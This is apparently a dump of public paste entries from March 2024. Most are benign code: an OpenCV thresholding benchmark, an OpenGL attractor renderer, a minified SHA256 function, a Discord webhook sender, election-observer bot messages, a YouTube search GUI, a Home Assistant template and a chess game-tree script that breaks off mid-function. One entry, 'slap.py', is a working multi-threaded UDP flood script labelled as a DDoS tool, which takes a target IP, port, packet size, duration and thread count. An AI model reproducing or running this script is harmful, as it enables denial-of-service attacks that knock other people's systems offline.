        ""preserve_init_image_color_profile"": false,
        ""use_upscale"": ""RealESRGAN_x4plus"",
        ""upscale_amount"": ""4"",
        ""latent_upscaler_steps"": ""10"",
        ""sampler_name"": ""euler_a"",
        ""use_stable_diffusion_model"": ""civitai/sdxl-unstable-diffusers-yamermix"",
        ""clip_skip"": false,
        ""tiling"": ""none"",
        ""use_vae_model"": """",
        ""use_controlnet_model"": """",
        ""control_filter_to_apply"": """",
        ""use_lora_model"": [],
        ""lora_alpha"": [],
        ""num_outputs"": 1,
        ""stream_image_progress"": false,
        ""show_only_filtered_image"": true,
        ""output_format"": ""jpeg""
    }
}"
E2Ue3FCk,For https://stackoverflow.com/q/78171957/3962537,dan-masek,C++,Saturday 16th of March 2024 04:36:36 PM CDT,"#include <chrono>

#include <opencv2/opencv.hpp>

// ===================================================================

namespace original {

double CalculateCriteria(const cv::Mat& im, int th)
{
    cv::Mat thresholdedIm = cv::Mat::zeros(im.size(), CV_64F);
    thresholdedIm.setTo(1, im >= th);

    double nbPixels = static_cast<double>(im.total());
    double nbPixels1 = cv::countNonZero(thresholdedIm);
    double weight1 = nbPixels1 / nbPixels;
    double weight0 = 1 - weight1;

    if (weight1 == 0 || weight0 == 0) {
        return std::numeric_limits<double>::infinity();
    }

    cv::Mat valPixels1, valPixels0;
    im.copyTo(valPixels1, thresholdedIm == 1);
    im.copyTo(valPixels0, thresholdedIm == 0);

    cv::Scalar mean1, stdDev1, mean0, stdDev0;
    cv::meanStdDev(valPixels1, mean1, stdDev1);
    cv::meanStdDev(valPixels0, mean0, stdDev0);

    double var1 = stdDev1[0] * stdDev1[0];
    double var0 = stdDev0[0] * stdDev0[0];

    return weight0 * var0 + weight1 * var1;
}

cv::Mat SelectThreshold(const cv::Mat& img)
{
    int maxVal = 255;
    std::vector<double> criterias;
    for (int th = 0; th <= maxVal; ++th) {
        criterias.push_back(original::CalculateCriteria(img, th));
    }

    auto minElement = std::min_element(criterias.begin(), criterias.end());
    int bestThreshold = static_cast<int>(std::distance(criterias.begin(), minElement));

    cv::Mat binary;
    cv::threshold(img, binary, bestThreshold, 255, cv::THRESH_BINARY);

    return binary;
}

} // namespace original

// ===================================================================

namespace dans1 {

    double CalculateCriteria(const cv::Mat& im, int th)
    {
        cv::Mat thresholdedIm = (im >= th);

        double nbPixels = static_cast<double>(im.total());
        double nbPixels1 = cv::countNonZero(thresholdedIm);
        double weight1 = nbPixels1 / nbPixels;
        double weight0 = 1 - weight1;

        if (weight1 == 0 || weight0 == 0) {
            return std::numeric_limits<double>::infinity();
        }

        cv::Mat valPixels1, valPixels0;
        im.copyTo(valPixels1, thresholdedIm);
        im.copyTo(valPixels0, ~thresholdedIm);

        cv::Scalar mean1, stdDev1, mean0, stdDev0;
        cv::meanStdDev(valPixels1, mean1, stdDev1);
        cv::meanStdDev(valPixels0, mean0, stdDev0);

        double var1 = stdDev1[0] * stdDev1[0];
        double var0 = stdDev0[0] * stdDev0[0];

        return weight0 * var0 + weight1 * var1;
    }

    cv::Mat SelectThreshold(const cv::Mat& img)
    {
        int maxVal = 255;
        std::vector<double> criterias;
        for (int th = 0; th <= maxVal; ++th) {
            criterias.push_back(dans1::CalculateCriteria(img, th));
        }

        auto minElement = std::min_element(criterias.begin(), criterias.end());
        int bestThreshold = static_cast<int>(std::distance(criterias.begin(), minElement));

        cv::Mat binary;
        cv::threshold(img, binary, bestThreshold, 255, cv::THRESH_BINARY);

        return binary;
    }

} // namespace original

// ===================================================================
namespace dans2 {

cv::Mat SelectThreshold(const cv::Mat& img)
{
    int const histSize = 256;
    float range[] = { 0, 256 };
    const float* histRange[] = { range };

    cv::Mat hist;
    cv::calcHist(&img, 1, 0, cv::Mat(), hist, 1, &histSize, histRange, true, false);
    hist.convertTo(hist, CV_64FC1);

    cv::Mat hist_sums = hist.clone();
    for (int i(0); i < histSize; ++i) {
        hist_sums.at<double>(i) *= i;
    }

    cv::Mat hist_rcumm = hist.clone();
    cv::Mat hist_sums_rcumm = hist_sums.clone();

    for (int i(histSize); i > 0; --i) {
        hist_rcumm.at<double>(i - 1) += hist_rcumm.at<double>(i);
        hist_sums_rcumm.at<double>(i - 1) += hist_sums_rcumm.at<double>(i);
    }

    cv::Mat means1 = hist_sums_rcumm / img.total();
    cv::Mat means0 = (hist_sums_rcumm.at<double>(0) - hist_sums_rcumm) / img.total();

    cv::Mat var0 = cv::Mat::zeros(histSize, 1, CV_64FC1);
    cv::Mat var1 = cv::Mat::zeros(histSize, 1, CV_64FC1);
    for (int th(0); th < histSize; ++th) {
        double mean0 = means0.at<double>(th);
        double mean1 = means1.at<double>(th);
        for (int i(0); i < histSize; ++i) {
            if (i >= th) {
                var0.at<double>(th) += hist.at<double>(i) * (0 - mean0) * (0 - mean0);
                var1.at<double>(th) += hist.at<double>(i) * (i - mean1) * (i - mean1);
            } else {
                var0.at<double>(th) += hist.at<double>(i) * (i - mean0) * (i - mean0);
                var1.at<double>(th) += hist.at<double>(i) * (0 - mean1) * (0 - mean1);
            }
        }
    }

    var0 /= img.total();
    var1 /= img.total();

    cv::Mat weights1 = hist_rcumm / img.total();
    cv::Mat weights0 = 1 - weights1;

    cv::Mat criterias = weights0.mul(var0) + weights1.mul(var1);

    cv::Point minLoc;
    cv::minMaxLoc(criterias, nullptr, nullptr, &minLoc);
    double const bestThreshold = minLoc.y;

    cv::Mat binary;
    cv::threshold(img, binary, bestThreshold, 255, cv::THRESH_BINARY);

    return binary;
}

} // namespace dans2

// ===================================================================

int main(int argc, const char* argv[])
{
    cv::Mat src_img = cv::imread(""sudoku.png"", cv::IMREAD_GRAYSCALE);

    cv::Mat result_img, result_img2, result_img3;

    std::vector<size_t> times, times2, times3;
    for (int i = 0; i < 16; ++i) {
        {
            auto start_t = std::chrono::high_resolution_clock::now();
            result_img = original::SelectThreshold(src_img);
            auto end_t = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_t - start_t);
            times.push_back(duration.count());
        }

        {
            auto start_t = std::chrono::high_resolution_clock::now();
            result_img2 = dans1::SelectThreshold(src_img);
            auto end_t = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_t - start_t);
            times2.push_back(duration.count());
        }

        {
            auto start_t = std::chrono::high_resolution_clock::now();
            result_img3 = dans2::SelectThreshold(src_img);
            auto end_t = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_t - start_t);
            times3.push_back(duration.count());
        }
    }

    std::sort(times.begin(), times.end());
    std::sort(times2.begin(), times2.end());
    std::sort(times3.begin(), times3.end());

    std::cout << times[0] << ""   "" << times2[0] << ""   "" << times3[0] << ""\n"";

    cv::Mat delta2, delta3;
    cv::absdiff(result_img, result_img2, delta2);
    cv::absdiff(result_img, result_img3, delta3);
    std::cout << cv::countNonZero(delta2) << "" "" << cv::countNonZero(delta3) << ""\n"";
}
"
Mx1MLkMT,tmp,maxim_shlyahtin,C++,Saturday 16th of March 2024 04:23:17 PM CDT,"#include <Windows.h> //Don't worry about this; it's needed to make GL.h work properly on Windows only (and then, only sometimes).
//#include <GL/glew.h>
#include <GL/GL.h>
#include <GL/GLU.h>
#include ""ode.cpp""
//#include <glm.hpp>
#include <chrono>
#include <iomanip>
#include <thread>
#include <mutex>

#define _USE_MATH_DEFINES

//Choose whether to use SDL1 or SDL2

#include <cstdio>
#include <SDL.h>
#include <SDL_opengl.h>
#pragma comment(lib,""SDL2.lib"")
#pragma comment(lib,""SDL2main.lib"")
static SDL_Window* window;
static SDL_Renderer* renderer;
#pragma comment(lib,""opengl32.lib"")
#pragma comment(lib,""glu32.lib"")


static int const screen_size[2] = { 800, 600 };

using glf = GLfloat;
using point3d = std::vector<glf>;

double camX = 0.0;
double camY = 0.0;
double R = 10.0;
double t;
double h = 0.002;
size_t dist = 10;

TA attractor(3);
std::vector<double> init_state = { 0, 1, 0 };
std::vector<point3d> points;
std::vector<point3d> buffer;
double next_b = attractor.b + 0.01;

void set_attr(TA& attr, std::vector<double> init) {
    attr.SetInit(0, init);
}



Uint32 callback(Uint32 interval, void* name) {
    double dt = interval / 100.0;
    // Get the current time point
    std::chrono::time_point<std::chrono::high_resolution_clock> tp = std::chrono::high_resolution_clock::now();

    // Convert the time point to a duration in microseconds (or any other unit you prefer)
    std::chrono::duration<double, std::micro> dur = tp.time_since_epoch();

    // Get the count of the duration as a double
    t = dur.count();

    camX = R * cos((2 * M_PI) / (60.0 * 1000.0) * (t / 1000.0));
    camY = R * sin((2 * M_PI) / (60.0 * 1000.0) * (t / 1000.0));
    glf x = static_cast<glf>(attractor.getX(0));
    glf y = static_cast<glf>(attractor.getX(1));
    glf z = static_cast<glf>(attractor.getX(2));
    attractor.NextStep(dt);
    return interval;
}

TA attractor2 = attractor;

Uint32 CalcNextBfunc(Uint32 interval, void* name) {
    glf x = static_cast<glf>(attractor2.getX(0));
    glf y = static_cast<glf>(attractor2.getX(1));
    glf z = static_cast<glf>(attractor2.getX(2));
    attractor2.NextStep(h);
    return interval;
}

static bool get_input(void) {
    SDL_Event event;
    while (SDL_PollEvent(&event)) {
        switch (event.type) {
        case SDL_QUIT: return false; //The little X in the window got pressed
        case SDL_KEYDOWN:
            if (event.key.keysym.sym == SDLK_ESCAPE) {
                return false;
            }
            break;
        }
    }
    return true;
}
static void draw(void) {
    //Clear the screen's color and depth (default color is black, but can change with glClearColor(...))
    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

    //Drawing to an area starting at the bottom left, screen_size[0] wide, and screen_size[1] high.
    glViewport(0, 0, screen_size[0], screen_size[1]);
    //OpenGL is a state machine.  Tell it that future commands changing the matrix are to change OpenGL's projection matrix
    glMatrixMode(GL_PROJECTION);
    //Reset the projection matrix
    glLoadIdentity();
    //Multiply a perspective projection matrix into OpenGL's projection matrix
    gluPerspective(45.0, (double)(screen_size[0]) / (double)(screen_size[1]), 0.1, 100.0);

    //Tell OpenGL that future commands changing the matrix are to change the modelview matrix
    glMatrixMode(GL_MODELVIEW);
    //Reset the modelview matrix
    glLoadIdentity();
    //Multiply OpenGL's modelview matrix with a transform matrix that simulates a camera at (2,3,4) looking towards the location (0,0,0) with up defined to be (0,1,0)
    glf cameraX = static_cast<glf>(camX);
    glf cameraY = static_cast<glf>(camY);
    gluLookAt(cameraX, cameraY, 10.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0);
    //gluLookAt(-20.0f, -15.0f, 20.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0);

    //Begin drawing triangles.  Every subsequent triplet of vertices will be interpreted as a single triangle.
    //  OpenGL's default color is white (1.0,1.0,1.0), so that's what color the triangle will be.
    //glColor3f(1.0f, 1.0f, 1.0f);

    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

    glf x = static_cast<glf>(attractor.getX(0));
    glf y = static_cast<glf>(attractor.getX(1));
    glf z = static_cast<glf>(attractor.getX(2));
    points.push_back({ x, y, z });
    //points_reverse.push_back({ x, y, z });
    //points_reverse.insert(points_reverse.begin(), {x, y, z});
    //std::reverse(points_reverse.begin(), points_reverse.end());
    glColor3f(1.0f, 1.0f, 1.0f); // Set the color to white
    glBegin(GL_POINTS);
    size_t number_of_points = points.size() - 1 > 0 ? points.size() - 1 : 1;
    //std::cout << number_of_points << "" time taken (in seconds): "" << std::fixed << t / 1000000.0  << '\n';
    for (size_t i = 0; i < number_of_points; i++) {
        if ((number_of_points - i) % dist == 0) {
            //tmp.push_back(number_of_points - i);
            glVertex3f(points[i].at(0), points[i].at(1), points[i].at(2));
        }
    }

    glEnd();
    SDL_GL_SwapWindow(window);

    //OpenGL works best double-buffered.  SDL automatically sets that up for us.  This will draw what we have
    //  just drawn to the screen so that we can see it.
    SDL_GL_SwapWindow(window);
    //OpenGL works best double-buffered.  SDL automatically sets that up for us.  This will draw what we have
    //  just drawn to the screen so that we can see it.
    SDL_GL_SwapWindow(window);
}

int main(int argc, char* argv[]) {
    set_attr(attractor, init_state);
    //Initialize everything, but don't catch fatal signals; give them to the OS.
    SDL_Init(SDL_INIT_EVERYTHING | SDL_INIT_NOPARACHUTE);


    //Creates the window
    window = SDL_CreateWindow(""SDL and OpenGL example - Ian Mallett"", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, screen_size[0], screen_size[1], SDL_WINDOW_OPENGL);
    //Create an OpenGL context.  In SDL 1, this was done automatically.
    SDL_GLContext context = SDL_GL_CreateContext(window);

    //We now have an OpenGL context, and can call OpenGL functions.

    //Objects need to test each other to see which one is in front.  If you don't do this, you'll ""see through"" things!
    glEnable(GL_DEPTH_TEST);

    SDL_TimerID timerID = SDL_AddTimer(20, callback, const_cast<char*>(""SDL""));
    //std::thread CalculateNextB(&CalcNextBfunc, attractor2);
    //SDL_TimerID timerID1 = SDL_AddTimer(20, CalcNextBfunc, )

    //Main application loop
    int c = 0;
    auto start = std::chrono::steady_clock::now();
    while (true) {
        if (!get_input()) break;
        draw();
        c++;
        if (c % 1000 == 0) {
            attractor.b += 0.01;
        }
        if (c == 20000) {
            auto end = std::chrono::steady_clock::now();
            std::cout << ""Elapsed time in seconds: ""
                << std::chrono::duration_cast<std::chrono::seconds>(end - start).count()
                << "" sec"";
        }
    }

    //TA::Test();

    SDL_RemoveTimer(timerID);

    //Clean up
    //CalculateNextB.join();
    SDL_GL_DeleteContext(context);
    SDL_DestroyWindow(window);
    SDL_Quit();

    //Return success; program exits
    return 0;
}"
c76x96d1,Compact VanillaJS SHA256 Function,FAT_Scripts,JavaScript,Saturday 16th of March 2024 04:17:37 PM CDT,"function sha256($){function x($,x){let f=(65535&$)+(65535&x);return($>>16)+(x>>16)+(f>>16)<<16|65535&f}function f($,x){return $>>>x|$<<32-x}function e($,x){return $>>>x}function _($,x,f){return $&x^~$&f}function c($,x,f){return $&x^$&f^x&f}function a($){return f($,2)^f($,13)^f($,22)}function r($){return f($,6)^f($,11)^f($,25)}function n($){var x;return f($,7)^f($,18)^(x=$)>>>3}function t($){var x;return f($,17)^f($,19)^(x=$)>>>10}let b=function $(x){let f=[];for(let e=0;e<8*x.length;e+=8)f[e>>5]|=(255&x.charCodeAt(e/8))<<24-e%32;return f}(function $(x){x=x.replace(/\r\n/g,""\n"");let f="""";for(let e=0;e<x.length;e++){let _=x.charCodeAt(e);_<128?f+=String.fromCharCode(_):_>127&&_<2048?(f+=String.fromCharCode(_>>6|192),f+=String.fromCharCode(63&_|128)):(f+=String.fromCharCode(_>>12|224),f+=String.fromCharCode(_>>6&63|128),f+=String.fromCharCode(63&_|128))}return f}($)),o=function $(f,e){let _=[1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298,],b=[1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225],o=Array(64),d,u,h,l,i,C,g,m,A,v,p,s;for(f[e>>5]|=128<<24-e%32,f[(e+64>>9<<4)+15]=e,A=0;A<f.length;A+=16){for(v=0,d=b[0],u=b[1],h=b[2],l=b[3],i=b[4],C=b[5],g=b[6],m=b[7];v<64;v++){var j,k,q;v<16?o[v]=f[v+A]:o[v]=x(x(x(t(o[v-2]),o[v-7]),n(o[v-15])),o[v-16]),p=x(x(x(x(m,r(i)),(j=i,k=C,j&k^~j&(q=g))),_[v]),o[v]),s=x(a(d),c(d,u,h)),m=g,g=C,C=i,i=x(l,p),l=h,h=u,u=d,d=x(p,s)}b[0]=x(d,b[0]),b[1]=x(u,b[1]),b[2]=x(h,b[2]),b[3]=x(l,b[3]),b[4]=x(i,b[4]),b[5]=x(C,b[5]),b[6]=x(g,b[6]),b[7]=x(m,b[7])}return b}(b,8*$.length);return function $(x){let f=""0123456789abcdef"",e="""";for(let _=0;_<4*x.length;_++)e+=f.charAt(x[_>>2]>>(3-_%4)*8+4&15)+f.charAt(x[_>>2]>>(3-_%4)*8&15);return e}(o)}"
sQCW4W2B,Generic Discord JS Webhook,FAT_Scripts,JavaScript,Saturday 16th of March 2024 04:12:31 PM CDT,"// Configuration for Discord Announcement
const Settings = {
    AvatarURL: '', // Optional: URL of the avatar image
    Name: 'Webhook Bot Name', // Display name of the bot
    Webhook: 'https://example.com', // Your Discord webhook URL
};

// Usage
// sendDiscordMessage();

// Send the formatted Discord message
function sendDiscordMessage(fields = []) {
    const request = new XMLHttpRequest();
    request.open('PUT', Settings.Webhook);
    request.setRequestHeader('Content-type', 'application/json');

    const messageContent = {
        username: Settings.Name,
        avatar_url: Settings.AvatarURL,
        content: `**Exciting News!**`,
        embeds: [{
            title: '🎉 It Works! 🎉',
            color: 0x00FFFF, // Light blue color
            image: {},
            thumbnail: {},
            footer: { text: 'Much Wow' },
            fields: fields
        }],
    };

    request.send(JSON.stringify(messageContent));
}
"
Dg0Lf8BQ,Untitled,nclopezo,Python,Saturday 16th of March 2024 04:10:03 PM CDT,"""""""
Module that defines an enumeration with the messages that the bot can send
""""""
import os

from enum import Enum


class BotMessages(Enum):
    ENGLISH = {
        'PLEASE_SEND_A_PHOTO':
            'Please send a photo to the bot. Thank you',
        'PHOTO_SUCCESSFULLY_RECEIVED':
            'The photo has been received successfully! Thank you!',
        'PHOTO_ALREADY_PROCESSED':
            'The photo has already been processed.',
        'USER_SENT_TOO_MANY_PHOTOS':
            'You have already sent too many photos to the bot. ',
        'USER_SENT_TOO_MANY_PHOTOS_IN_THE_LAST_HOUR':
            'You have already sent too many photos to the bot in the last hour.',
        'PHOTO_CONTAINS_INAPPROPIATE_CONTENT':
            'The photo contains inappropiate content. Please send another photo.',
        'PHOTO_IS_NOT_A_DOCUMENT':
            'The photo does not look like a document. Please send another photo.',
        'NOT_IN_WORKING_DATES':
            'The bot is not available at the moment. Please try again during the activation times.',
        'PROVIDE_POLLING_STATION_NUMBER_AND_REGION_ID':
            'Please provide the site ID and region separated by a comma. Thank you.',
        'INVALID_SITE_ID_AND_REGION_ID':
            'Invalid site ID, please provide a valid site and region id.',
        'PROVIDE_PORTABLE_AND_STATIONARY_BOXES':
            'Please provide the number of portable and stationary boxes separated by a comma (7 and 8), for example: '
            '1,2. Thank you.',
        'INVALID_NUM_PORTABLE_AND_STATIONARY_BOXES':
            'Invalid numbers please write the numbers separated by comma, for example: 1,2. ',
        'PROVIDE_INVALID_AND_VALID_BALLOTS':
            'Please provide the number of invalid and valid ballots separated by a comma (9 and 10), '
            'for example: 1,2. Thank you.',
        'INVALID_NUM_OF_INVALID_AND_VALID_BALLOTS':
            'Invalid numbers, please write the numbers separated by comma, for example: 1,2.',
        'PLEASE_PROVIDE_BALLOTS_IN_FAVOR':
            'Please provide the number of ballots in favor. Thank you. (13 to 16)',
        'INVALID_NUM_OF_BALLOTS_IN_FAVOR':
            'Invalid number of ballots in favor, please write the numbers separated by comma, for example: 1,2,3,4.',
        'THE_NUMBERS_ARE_NOT_COHERENT':
            'The numbers are not coherent. Please provide the numbers again.',
        'THE_NUMBERS_ARE_COHERENT':
            'The numbers are correct. Thank you! Please now send a photo of the protocol.',
    }
    RUSSIAN = {
        'PLEASE_SEND_A_PHOTO':
            'Приложите фотографию протокола. Спасибо.',
        'PHOTO_SUCCESSFULLY_RECEIVED':
            'Фотография успешно загружена! Спасибо!',
        'PHOTO_ALREADY_PROCESSED':
            'The photo has already been processed.',
        'USER_SENT_TOO_MANY_PHOTOS':
            'От Вас поступило слишком много фотографий.',
        'USER_SENT_TOO_MANY_PHOTOS_IN_THE_LAST_HOUR':
            'От Вас поступило слишком много фотографий за последний час.',
        'PHOTO_CONTAINS_INAPPROPIATE_CONTENT':
            'Эта фотография не похожа на документ. Замените фотографию.',
        'PHOTO_IS_NOT_A_DOCUMENT':
            'Эта фотография не похожа на документ. Замените фотографию.',
        'NOT_IN_WORKING_DATES':
            'Время загрузок ещё не пришло. Ждите до 22.00 17.03.2024 по московскому времени',
        'PROVIDE_POLLING_STATION_NUMBER_AND_REGION_ID':
            'Введите номер избирательного участка и номер субъекта федерации через запятую',
        'INVALID_SITE_ID_AND_REGION_ID':
            'Invalid site ID, please provide a valid site ID.',
        'PROVIDE_PORTABLE_AND_STATIONARY_BOXES':
            'Введите число бюллетеней в переносных и стационарных ящиках через запятую (строки 7 и 8)',
        'INVALID_NUM_PORTABLE_AND_STATIONARY_BOXES':
            'Ошибка при вводе числа бюллетеней из строк 7 и 8. Введите два числа через запятую.',
        'PROVIDE_INVALID_AND_VALID_BALLOTS':
            'Введите число недействительных и действительных бюллетеней через запятую (строки 9 и 10)',
        'INVALID_NUM_OF_INVALID_AND_VALID_BALLOTS':
            'Ошибка при вводе числа бюллетеней из строк 9 и 10. Введите два числа через запятую.',
        'PLEASE_PROVIDE_BALLOTS_IN_FAVOR':
            'Введите число бюллетеней за каждого кандидата через запятую (строки с 13 по 16)',
        'INVALID_NUM_OF_BALLOTS_IN_FAVOR':
            'Invalid number of ballots in favor, please write the numbers separated by comma, for example: 1,2,3,4.',
        'THE_NUMBERS_ARE_NOT_COHERENT':
            'Вы допустили ошибку/ки при вводе числа бюллетеней. Повторите ввод сначала, старайтесь быть внимательней',
        'THE_NUMBERS_ARE_COHERENT':
            'Число бюллетеней введено правильно. Спасибо! Теперь загрузите фото или скан протокола (jpg-файл).',
    }


def get_bot_message(message_key):
    language = os.getenv('BOT_LANGUAGE', 'ENGLISH')  # Default language is English if not specified
    if language.upper() == 'RUSSIAN':
        return BotMessages.RUSSIAN.value.get(message_key, '')
    else:
        return BotMessages.ENGLISH.value.get(message_key, '')
"
zxiYjpC2,slap.py,betrayed,Python,Saturday 16th of March 2024 03:55:01 PM CDT,"#!/usr/bin/env python3
# MULTI-THREADED UDP DDOS SCRIPT
# PROGRAMMED BY BETRAYED

import sys, time, socket, threading
data = ''
_end = False

def _doWork():
    while True:
        try:
            if _end == True:
              break 
          
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((sys.argv[1], int(sys.argv[2])))
            s.send(data.encode())
            
            while _end == False:
                s.send(data.encode()) 
                
            s.close()
        except:
            pass

def main():
    if len(sys.argv) != 6:
        sys.exit(""\r\n    SYNTAX: <IP> <PORT> <SIZE> <TIME> <THREAD/S>\r\n"")
    
    global data, _end
    
    while len(data) < int(sys.argv[3]):
        data = data + ""$""
    
    print(""""""\r\n\r\n\r\n\r\n\r\n\r\n\r\n
    ▄████████  ▄█          ▄████████    ▄███████▄ 
   ███    ███ ███         ███░░░░███   ███░░░░███ 
  ░███    █▀ ░███        ░███   ░███  ░███   ░███ 
  ░███       ░███        ░███   ░███  ░███   ░███ 
 ▀███████████░███       ▀███████████ ▀█████████▀  
 ░░░░░░░░░███░███       ░░███░░░░███ ░░███░░░░        
    ▄█    ███░███▌    ▄  ░███   ░███  ░███        
  ▄████████▀ ░█████▄▄██  ░███   ░█▀   ▄████▀      
 ░░░░░░░░░   ░▀░░░░░░░   ░░░    ░    ░░░░░
          """""")
    print(""Smacking the dog sh*t out of "" + sys.argv[1] + "":"" + sys.argv[2] + "" for "" + sys.argv[4] + "" seconds...\r\n"")
          
    tasks = []
    i = 0
    while True:
        i +=1
        x = threading.Thread(target=_doWork)
        tasks.append(x)
        x.start()
        if i == int(sys.argv[5]):
            break
    
    stopAt = time.time() + int(sys.argv[4])
    try:
        while time.time() < stopAt:
            pass
    except KeyboardInterrupt:
        pass
    
    _end = True
    
    for y in tasks:
        y.join()
        
    sys.exit(""\r\nDone.\r\n"")
    
if __name__ == ""__main__"":
    main()
"
Z1SqvWeC,YOUTUBE VIDEO PLAYER,Nenogzar,Python,Saturday 16th of March 2024 03:45:35 PM CDT,"import tkinter as tk
import os
import webbrowser
from youtube_search import YoutubeSearch
from pytube import YouTube


class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.video_urls = {}  # Initialize video URL dictionary

        # Color Palette
        self.bg_color = ""#336699""
        self.button_color = ""#4CAF50""
        self.text_color = ""white""

        self.main_frame = tk.Frame(root, bg=self.bg_color)
        self.main_frame.pack(fill=""both"", expand=True)

        self.title_label = tk.Label(self.main_frame, text=""YOUTUBE VIDEO PLAYER"", font=(""Arial"", 24, ""bold""),
                                    fg=self.text_color, bg=self.bg_color)
        self.title_label.pack(pady=10)

        self.search_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.search_frame.pack(fill=""x"")

        self.search_entry = tk.Entry(self.search_frame)
        self.search_entry.pack(side=""left"", fill=""x"", expand=True, padx=5, pady=5)

        self.search_button = tk.Button(self.search_frame, text=""Search YouTube"", command=self.search_and_play,
                                       bg=self.button_color, fg=self.text_color)
        self.search_button.pack(side=""left"", padx=5, pady=5)

        self.save_button = tk.Button(self.search_frame, text=""Save"", command=self.save_results, bg=self.button_color,
                                     fg=self.text_color)
        self.save_button.pack(side=""left"", padx=5, pady=5)

        self.list_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.list_frame.pack(side=""left"", fill=""both"", expand=False)

        self.button_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.button_frame.pack(side=""bottom"", fill=""x"")

        self.lst = tk.Listbox(self.list_frame, width=30, height=20, bg=self.bg_color, fg=self.text_color)
        self.lst.pack(side=""left"", fill=""both"", expand=True)

        self.scrollbar = tk.Scrollbar(self.list_frame, orient=""vertical"", command=self.lst.yview)
        self.scrollbar.pack(side=""right"", fill=""y"")
        self.lst.config(yscrollcommand=self.scrollbar.set)

        self.play_button = tk.Button(self.button_frame, text=""Play"", command=self.play_video, bg=self.button_color,
                                     fg=self.text_color)
        self.play_button.pack(side=""left"", padx=5, pady=5)

        self.stop_button = tk.Button(self.button_frame, text=""Stop"", command=self.stop_video, bg=self.button_color,
                                     fg=self.text_color)
        self.stop_button.pack(side=""left"", padx=5, pady=5)

        self.current_video_label = tk.Label(root, text=""No video selected"", bg=self.bg_color, fg=self.text_color)
        self.current_video_label.pack(pady=5)

        self.player_frame = tk.Frame(self.main_frame)
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.lst.bind(""<<ListboxSelect>>"", self.show_video)


        self.load_saved_results()

    def search_and_play(self):
        query = self.search_entry.get()
        search_results = YoutubeSearch(query, max_results=5).to_dict()
        if search_results:
            self.lst.delete(0, tk.END)
            for result in search_results:
                video_title = result['title']
                video_url = 'https://www.youtube.com' + result['url_suffix']
                self.lst.insert(tk.END, video_title)
                self.video_urls[video_title] = video_url  # Store title and URL in dictionary
            self.save_results()  # Save updated list of videos

    """""" os play """"""
    # def play_video(self):
    #     if self.lst.curselection():
    #         title = self.lst.get(self.lst.curselection())
    #         video_url = self.video_urls.get(title)  # Get URL from dictionary
    #         print(""Playing video:"", video_url)  # Print URL for debugging
    #
    #         # Отваряме URL адреса в стандартния браузър на Windows
    #         os.system(f'start {video_url}')
    #         self.current_video_label.config(text=f""Playing: {title}"")
    #     else:
    #         print(""No video selected."")


    def play_video(self):
        if self.lst.curselection():
            title = self.lst.get(self.lst.curselection())
            video_url = self.video_urls.get(title)  # Get URL from dictionary
            print(""Playing video:"", video_url)  # Print URL for debugging

            webbrowser.open(video_url)
            self.current_video_label.config(text=f""Playing: {title}"")
        else:
            print(""No video selected."")
    def stop_video(self):
        self.current_video_label.config(text=""Video stopped"")

    def save_results(self):
        with open(""YouTube_list.txt"", ""a"") as file:
            for title, url in self.video_urls.items():
                file.write(f""{title}: {url}\n"")

    def load_saved_results(self):
        try:
            with open(""YouTube_list.txt"", ""r"") as file:
                for line in file:
                    if ':' in line:
                        title, url = line.strip().split(': ', 1)
                        self.video_urls[title] = url
                        self.lst.insert(tk.END, title)
        except FileNotFoundError:
            print(""No saved results found."")

    def show_video(self, event):

        pass

root = tk.Tk()
root.geometry(""800x600+300+50"")
root.title(""YouTube Player"")
root.configure(bg=""#336699"")
video_player = VideoPlayer(root)
root.mainloop()
"
yEJ6ZeB9,How do we make an entity in Home Assistant from two other entities?,LeventeDaradici,YAML,Saturday 16th of March 2024 02:50:23 PM CDT,"// https://youtu.be/QheN8Jz8vTY
//
sensor:
  - platform: template
    sensors:
      difference_power_entities:
        friendly_name: ""Consum Casă""
        unit_of_measurement: ""W""
        value_template: ""{{ (states('sensor.inverter_active_power') | float - states('sensor.power_meter_active_power') | float) | abs }}""
"
jQ090L01,gives 2 plies instead of 4,max2201111,Python,Saturday 16th of March 2024 02:47:13 PM CDT,"import chess

def simplify_fen(fen):
    """"""Simplifies a FEN string to include only position, turn, castling availability, and en passant target.""""""
    return ' '.join(fen.split(' ')[:4])

def initialize_game_tree(initial_fen):
    """"""Initializes the game tree with the root node based on the initial FEN.""""""
    simplified_fen = simplify_fen(initial_fen)
    game_tree = {1: {'fen': simplified_fen, 'parent': None, 'color': chess.WHITE if 'w' in initial_fen else chess.BLACK, 'children': [], 'moves_to_mate': None}}
    fen_to_node_id = {simplified_fen: 1}
    return game_tree, fen_to_node_id

def add_descendants_iteratively(game_tree, fen_to_node_id):
    """"""Expands the game tree by iteratively adding legal move descendants of each game state.""""""
    queue = [(1, 0)]
    while queue:
        node_id, _ = queue.pop(0)
        board = chess.Board(game_tree[node_id]['fen'] + "" 0 1"")
        for move in board.legal_moves:
            board.push(move)
            simplified_fen = simplify_fen(board.fen())
            if simplified_fen not in fen_to_node_id:
                new_node_id = len(game_tree) + 1
